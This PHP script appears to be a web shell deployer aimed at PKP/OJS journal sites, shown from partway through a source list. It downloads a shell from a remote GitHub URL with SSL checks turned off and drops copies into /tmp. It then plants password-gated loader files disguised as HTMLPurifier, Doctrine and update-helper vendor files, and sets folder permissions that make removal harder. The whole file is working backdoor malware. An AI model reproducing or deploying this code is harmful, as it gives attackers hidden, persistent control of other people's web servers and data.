    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt',
];

// ============ FUNCTIONS ============
function getContent($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data && strlen($data) > 100) return $data;
    }
    return @file_get_contents($url);
}

function randomName() {
    return substr(md5(uniqid(mt_rand(), true)), 0, 16) . '.' . rand(10000000, 99999999) . '.' . rand(10000000, 99999999) . '.php';
}

function createFolder($path) {
    if (!is_dir($path)) {
        @mkdir($path, 0777, true);
    }
    @chmod($path, 05555); // 5555
    return is_dir($path);
}

function createLoader($path, $shell_path, $key = 'alfamaster') {
    $content = '<?php
// ==========================================
// LOADER - Include Shell
// ==========================================
// File: ' . basename($path) . '
// Shell: ' . basename($shell_path) . '
// ==========================================

$key = isset($_GET["key"]) ? $_GET["key"] : "";
if ($key !== "' . $key . '") die("404 - Not Found");

if (file_exists("' . $shell_path . '")) {
    include "' . $shell_path . '";
} else {
    die("❌ Shell not found");
}
?>';
    
    if (@file_put_contents($path, $content)) {
        @chmod($path, 0644);
        return true;
    }
    return false;
}

// ============ DEPLOY SHELL KE /tmp/ ============
$deployed = [];
foreach ($sources as $src) {
    $content = getContent($src);
    if ($content && strlen($content) > 100) {
        for ($i = 0; $i < 3; $i++) {
            $name = randomName();
            $path = '/tmp/' . $name;
            if (@file_put_contents($path, $content)) {
                @chmod($path, 0644);
                $deployed[] = ['file' => $name, 'path' => $path, 'source' => basename($src)];
            }
        }
    }
}

// ============ AMBIL SHELL TERBARU ============
$shell_files = glob('/tmp/*.php');
usort($shell_files, function($a, $b) {
    return filemtime($a) - filemtime($b);
});
$latest_shell = end($shell_files);

// ============ BUAT MASS LOADER ============
$loader_locations = [
    // HTMLPurifier
    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier.inc.php',
    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/VarParserException.inc.php',
    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/HTMLModule/TargetNoreferrer.inc.php',
    
    // Doctrine Inflector
    'lib/pkp/lib/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/src/Transformations.inc.php',
    
    // Tambahan lokasi
    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/config.inc.php',
    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/settings.inc.php',
    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/cache.inc.php',
    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/session.inc.php',
    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/auth.inc.php',
    
    // Tambahan di root
    'docs/config.inc.php',
    'public/config.inc.php',
    'cache/config.inc.php',
];

$loaders_created = [];
$doc_root = $_SERVER['DOCUMENT_ROOT'];

foreach ($loader_locations as $loc) {
    $full_path = $doc_root . '/' . $loc;
    $dir = dirname($full_path);
    
    // Buat folder & chmod 5555
    if (createFolder($dir)) {
        // Buat loader file
        if (createLoader($full_path, $latest_shell)) {
            $loaders_created[] = $loc;
        }
    }
}

// ============ BUAT FOLDER KHUSUS DENGAN 5555 ============
$special_folders = [
    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/Config',
    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/Definition',
    'lib/pkp/lib/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/src/Cache',
    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/Backup',
    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/Logs',
];

foreach ($special_folders as $folder) {
    $full_path = $doc_root . '/' . $folder;
    createFolder($full_path);
}

// ============ CLEAN ============
if (isset($_GET['clean'])) {
    foreach (glob('/tmp/*.php') as $f) @unlink($f);
    foreach ($loader_locations as $loc) {
        $full_path = $doc_root . '/' . $loc;
        if (file_exists($full_path)) @unlink($full_path);
    }
    die("✅ Cleaned all shells and loaders");
}

// ============ DOMAIN ============
$domain = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'];
$total = count($deployed);
$total_loaders = count($loaders_created);
?>

